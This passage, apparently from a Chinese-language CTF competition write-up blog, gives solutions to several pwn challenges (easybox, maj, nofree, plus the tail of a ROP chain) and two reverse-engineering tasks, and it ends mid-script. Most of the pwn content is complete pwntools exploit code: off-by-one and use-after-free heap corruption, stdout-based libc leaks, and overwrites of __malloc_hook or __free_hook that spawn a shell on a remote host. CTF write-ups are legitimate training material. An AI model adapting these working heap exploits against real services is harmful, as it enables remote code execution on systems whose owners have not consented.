class="line">rop += p64(pop_rax_rdx_rbx)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(bss)</span><br><span class="line">rop += p64(syscall)<span class="comment">#read</span></span><br><span class="line">rop += p64(pop_rdi)</span><br><span class="line">rop += p64(bss+<span class="number">0x100</span>)</span><br><span class="line">rop += p64(puts)<span class="comment">#puts</span></span><br><span class="line">rop += <span class="string">&quot;^&#123;@^&#125;$&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;enter your code:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;^&#123;@^&#125;&amp;&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;running....\n&quot;</span>)</span><br><span class="line">byte = u32(p.recv(<span class="number">1</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>) -<span class="number">1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;continue?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;enter your code:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;^&#123;@^&#125;$&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;running....\n&quot;</span>)</span><br><span class="line">p.send(p64(byte+<span class="number">0x48</span>)[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;continue?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;enter your code:&quot;</span>)</span><br><span class="line">p.send(rop+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;running....\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x00000000004dc054&#x27;)</span></span><br><span class="line">p.send(p64(byte)[<span class="number">0</span>])</span><br><span class="line">p.recvuntil(<span class="string">&quot;continue?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h3><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>存在off by one漏洞，利用漏洞可以实现chunk extend，得到两个指向同一地址的指针。然后利用堆错位来伪造size位等，实现将同一个地址先后free进fastbin和unsortbin，进而利用main_arean劫持stdout结构(1/16概率)，使用io_leak的方法获取到libc地址。</p><p>接着用fastbin的double free漏洞劫持__malloc_hook，从而getshell。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;101.200.53.148&quot;</span>,<span class="string">&quot;34521&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./pwn&quot;</span>).libc</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#one = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">    one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xf8</span>,<span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">    p.recv(<span class="number">32</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) -<span class="number">0x3C56A3</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0xa</span>,<span class="number">0xf8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xb</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xc</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">    add(<span class="number">0xd</span>,<span class="number">0xe8</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">0xc</span>)</span><br><span class="line">    add(<span class="number">0xc</span>,<span class="number">0xf8</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">6</span>)+p64(libc.address+one[<span class="number">3</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b malloc&#x27;)</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;idx:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#exp()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;fail&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="maj"><a href="#maj" class="headerlink" title="maj"></a>maj</h3><h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>存在大量混淆，可以直接忽略。</p><p>free时未清空堆指针，从而可以利用堆错位来伪造size位等，实现将同一个地址先后free进fastbin和unsortbin，进而利用main_arean劫持stdout结构(1/16概率)，使用io_leak的方法获取到libc地址。</p><p>并且因为没有开启pie，因而可以劫持堆指针。</p><p>构造一个堆指针指向<code>__free_hook</code>，将其改为system，从而实现getshell。</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./pwn&quot;</span>).libc</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    p = remote(<span class="string">&quot;101.200.53.148&quot;</span> ,<span class="string">&quot;15423&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;please answer the question&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;82&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;you are right&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;start_the_game,yes_or_no?&quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;index ?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;index ?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;__new_content ?&quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x7f</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x603260</span>))</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">    edit(<span class="number">4</span>,p32(<span class="number">0xff</span>)*<span class="number">24</span>)</span><br><span class="line">    edit(<span class="number">4</span>,p32(<span class="number">0xff</span>)*<span class="number">28</span>+p64(<span class="number">0x6032e0</span>))</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>))</span><br><span class="line">    add(<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x21</span>))<span class="comment">#5</span></span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">    add(<span class="number">0x18</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x80&#x27;</span>)</span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    edit(<span class="number">5</span>,<span class="string">&#x27;\xdd\x25&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x70&#x27;</span>)</span><br><span class="line">    edit(<span class="number">5</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x68</span>,<span class="string">&#x27;aaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    p.recvuntil(p64(<span class="number">0xfbad1800</span>))</span><br><span class="line">    p.recv(<span class="number">32</span>)</span><br><span class="line">    libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) -<span class="number">0x3C56A3</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6032e0</span>)+p64(<span class="number">0x603260</span>)+p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    edit(<span class="number">2</span>,p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;fail&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h3><p>strdup存在00截断，因而可以溢出堆块。通过 House of Orange 构造使top chunk进入0x70的fastbin中，从而控制堆指针，达到任意写。</p><p>这里采用爆破第4位（概率为1/16）的方式将read改为onegadget，从而getshell。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">    p = remote(<span class="string">&quot;101.200.53.148&quot;</span>,<span class="string">&quot;12301&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">        p.recvuntil(<span class="string">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">    one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x0fe1</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">        add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x90</span>)</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x71</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6021c0</span>))</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x71</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x71</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>))</span><br><span class="line">    edit(<span class="number">1</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>))</span><br><span class="line">    <span class="comment">#0-&gt;heap_ptr</span></span><br><span class="line">    edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0xfffff</span>)+p64(<span class="number">0x0602048</span>)+p64(<span class="number">0xffff</span>))</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x64\x03&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&#x27;b *0x400934&#x27;)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="comment">#exp()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;fail&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><p>简单加解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res=[<span class="number">0xDD</span>, <span class="number">0x5B</span>, <span class="number">0x9E</span>, <span class="number">0x1D</span>, <span class="number">0x20</span>, <span class="number">0x9E</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0xDE</span>, <span class="number">0x8B</span>, <span class="number">0x11</span>, <span class="number">0xD1</span>, <span class="number">0x1E</span>, <span class="number">0x9E</span>, <span class="number">0x8B</span>, <span class="number">0x51</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x8B</span>, <span class="number">0x9E</span>, <span class="number">0x5D</span>, <span class="number">0x5D</span>, <span class="number">0x11</span>, <span class="number">0x8B</span>, <span class="number">0x90</span>, <span class="number">0x12</span>, <span class="number">0x91</span>, <span class="number">0x50</span>, <span class="number">0x12</span>, <span class="number">0xD2</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x1E</span>, <span class="number">0x9E</span>, <span class="number">0x90</span>, <span class="number">0xD2</span>, <span class="number">0x9F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    res[i]=((res[i]-<span class="number">35</span>)^<span class="number">0x23</span>)&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((res[i]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0xff</span>)^((res[i]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xff</span>)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>z3 直接解， 签到题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v4 = [<span class="number">0x00004F17</span>, <span class="number">0x00009CF6</span>, <span class="number">0x00008DDB</span>, <span class="number">0x00008EA6</span>, <span class="number">0x00006929</span>, <span class="number">0x00009911</span>, <span class="number">0x000040A2</span>, <span class="number">0x00002F3E</span>, <span class="number">0x000062B6</span>, <span class="number">0x00004B82</span>, <span class="number">0x0000486C</span>, <span class="number">0x00004002</span>, <span class="number">0x000052D7</span>, <span class="number">0x00002DEF</span>, <span class="number">0x000028DC</span>, <span class="number">0x0000640D</span>, <span class="number">0x0000528F</span>, <span class="number">0x0000613B</span>, <span class="number">0x00004781</span>, <span class="number">0x00006B17</span>, <span class="number">0x00003237</span>, <span class="number">0x00002A93</span>, <span class="number">0x0000615F</span>, <span class="number">0x000050BE</span>, <span class="number">0x0000598E</span>, <span class="number">0x00004656</span>, <span class="number">0x00005B31</span>, <span class="number">0x0000313A</span>, <span class="number">0x00003010</span>, <span class="number">0x000067FE</span>, <span class="number">0x00004D5F</span>, <span class="number">0x000058DB</span>, <span class="number">0x00003799</span>, <span class="number">0x000060A0</span>, <span class="number">0x00002750</span>, <span class="number">0x00003759</span>, <span class="number">0x00008953</span>, <span class="number">0x00007122</span>, <span class="number">0x000081F9</span>, <span class="number">0x00005524</span>, <span class="number">0x00008971</span>, <span class="number">0x00003A1D</span>]</span><br><span class="line"></span><br><span class="line">v5 = IntVector(<span class="string">&#x27;x&#x27;</span>, <span class="number">42</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(v4[<span class="number">0</span>]==<span class="number">34</span>*v5[<span class="number">3</span>]+<span class="number">12</span>*v5[<span class="number">0</span>]+<span class="number">53</span>*v5[<span class="number">1</span>]+<span class="number">6</span>*v5[<span class="number">2</span>]+<span class="number">58</span>*v5[<span class="number">4</span>]+<span class="number">36</span>*v5[<span class="number">5</span>]+v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">1</span>]==<span class="number">27</span>*v5[<span class="number">4</span>]+<span class="number">73</span>*v5[<span class="number">3</span>]+<span class="number">12</span>*v5[<span class="number">2</span>]+<span class="number">83</span>*v5[<span class="number">0</span>]+<span class="number">85</span>*v5[<span class="number">1</span>]+<span class="number">96</span>*v5[<span class="number">5</span>]+<span class="number">52</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">2</span>]==<span class="number">24</span>*v5[<span class="number">2</span>]+<span class="number">78</span>*v5[<span class="number">0</span>]+<span class="number">53</span>*v5[<span class="number">1</span>]+<span class="number">36</span>*v5[<span class="number">3</span>]+<span class="number">86</span>*v5[<span class="number">4</span>]+<span class="number">25</span>*v5[<span class="number">5</span>]+<span class="number">46</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">3</span>]==<span class="number">78</span>*v5[<span class="number">1</span>]+<span class="number">39</span>*v5[<span class="number">0</span>]+<span class="number">52</span>*v5[<span class="number">2</span>]+<span class="number">9</span>*v5[<span class="number">3</span>]+<span class="number">62</span>*v5[<span class="number">4</span>]+<span class="number">37</span>*v5[<span class="number">5</span>]+<span class="number">84</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">4</span>]==<span class="number">48</span>*v5[<span class="number">4</span>]+<span class="number">14</span>*v5[<span class="number">2</span>]+<span class="number">23</span>*v5[<span class="number">0</span>]+<span class="number">6</span>*v5[<span class="number">1</span>]+<span class="number">74</span>*v5[<span class="number">3</span>]+<span class="number">12</span>*v5[<span class="number">5</span>]+<span class="number">83</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">5</span>]==<span class="number">15</span>*v5[<span class="number">5</span>]+<span class="number">48</span>*v5[<span class="number">4</span>]+<span class="number">92</span>*v5[<span class="number">2</span>]+<span class="number">85</span>*v5[<span class="number">1</span>]+<span class="number">27</span>*v5[<span class="number">0</span>]+<span class="number">42</span>*v5[<span class="number">3</span>]+<span class="number">72</span>*v5[<span class="number">6</span>])</span><br><span class="line">s.add(v4[<span class="number">6</span>]==<span class="number">26</span>*v5[<span class="number">5</span>]+<span class="number">67</span>*v5[<span class="number">3</span>]+<span class="number">6</span>*v5[<span class="number">1</span>]+<span class="number">4</span>*v5[<span class="number">0</span>]+<span class="number">3</span>*v5[<span 